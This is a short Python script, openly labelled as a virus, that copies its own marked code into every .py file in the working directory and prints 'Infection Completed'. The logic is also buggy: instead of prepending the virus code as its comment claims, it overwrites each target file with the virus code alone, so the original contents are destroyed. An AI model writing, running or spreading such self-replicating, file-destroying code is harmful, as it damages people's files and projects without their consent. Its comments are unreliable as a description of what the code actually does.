#start of virus code
import glob,re,sys
viruscode = []


#open file and read all lines between start and end

this_file_Location = sys.argv[0]

virusfile = open(this_file_Location,"r")

lines = virusfile.readlines()
virusfile.close()

#save the lines into a list to use later

inViruscode = False
for line in lines:
    if(re.search("^#start of virus code",line)):
        inViruscode = True

    if(inViruscode == True):
        viruscode.append(line)
        #The empty list "viruscode" will fill up with all the code of this file.
    
        if(re.search("^#end of virus code",line)):
            break

#Time to find victims

files = glob.glob("*.py") #this will only search python files

for f in files:   #for each file this will do bellow things
    file = open(f,"r")
    filecode = file.readlines()
    file.close()

    infected = False
    for line in filecode:
        if(re.search("^#start of virus code", line)):
            infected = True
            break

        if not infected:
            newCode = []
            
            newCode.extend(viruscode)
            
            #now re-write the infected file with virus code and old code
            file = open(f,"w")
            file.writelines(newCode)
            file.close


    #paylode
    print("Infection Completed")






#end of virus code
